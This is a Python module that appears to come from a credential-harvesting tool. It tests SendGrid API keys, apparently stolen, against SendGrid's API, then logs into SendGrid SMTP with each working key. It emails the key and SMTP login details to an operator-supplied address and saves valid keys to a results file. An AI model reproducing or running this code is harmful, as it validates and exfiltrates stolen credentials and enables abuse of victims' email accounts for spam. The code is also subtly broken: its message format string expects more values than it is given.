import requests,json,smtplib
from tool._print import sendgrid_print

email = open("files/YOUREMAIL.txt","r").read()

def main(api_key):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0',
    'Authorization': 'Bearer '+api_key,}
    result = requests.get('https://api.sendgrid.com/v3/user/credits',headers=headers,timeout=15).content
    x = json.loads(result)
    if 'reset_frequency' in x:
        getemail = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers,timeout=15).json()
        serveraddr = 'smtp.sendgrid.net'
        toaddr = email
        fromaddr = getemail['email']
        serverport = 587
        smtp_user = "apikey"
        smtp_pass = api_key
        msg = "From: %s\r\nTo: %s\r\nSubject: !XProad_Sendgrid %s|%s|%s|%s\r\n\r\nTest message from laravel monster v2 sent at %s" % (
        fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass)
        server = smtplib.SMTP()
        try:
            server.connect(serveraddr, serverport)
            server.login(smtp_user, smtp_pass)
            server.sendmail(fromaddr, toaddr, msg)
            open('results/sendgrid.txt', 'a').write(f"apikey|{api_key}|{fromaddr}  [{x}]\n")
            server.quit()
            return sendgrid_print()
        except:
            pass